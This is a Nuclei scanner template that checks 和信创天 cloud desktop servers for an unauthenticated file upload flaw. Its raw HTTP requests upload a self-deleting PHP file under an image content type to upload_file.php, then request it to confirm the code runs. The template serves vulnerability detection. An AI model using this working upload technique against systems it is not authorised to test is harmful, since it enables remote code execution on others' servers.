id: vesystem_upload_file-fileupload
info:
  name: 和信创天云桌面系统 upload_file.php - fileupload
  author: leadlife
  severity: critical
  description: 
  reference: 
    - https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: demo
  tags: vesystem,fileupload

variables:
    filename: "{{to_lower(rand_base(4))}}"
    date: '{{date_time("%Y%M%D%H%M%S")}}'

http:
  - raw:
      - |
        POST /Upload/upload_file.php?l=test HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36
        Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,fil;q=0.8
        Cookie: think_language=zh-cn; PHPSESSID_NAMED=h9j8utbmv82cb1dcdlav1cgdf6
        Connection: close
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv
        Content-Length: 183

        ------WebKitFormBoundaryfcKRltGv
        Content-Disposition: form-data; name="file"; filename="test.php"
        Content-Type: image/avif

        <?php print("{{randstr}}");unlink(__FILE__);?>
        ------WebKitFormBoundaryfcKRltGv--
      
      - |+
        GET /Upload/test/test.php HTTP/1.1
        Host: {{Hostname}}
        
    matchers:
      - type: dsl
        dsl:
          - status_code_1 == 200 && status_code_2 == 200
          - contains(body_2,'{{randstr}}')
        condition: and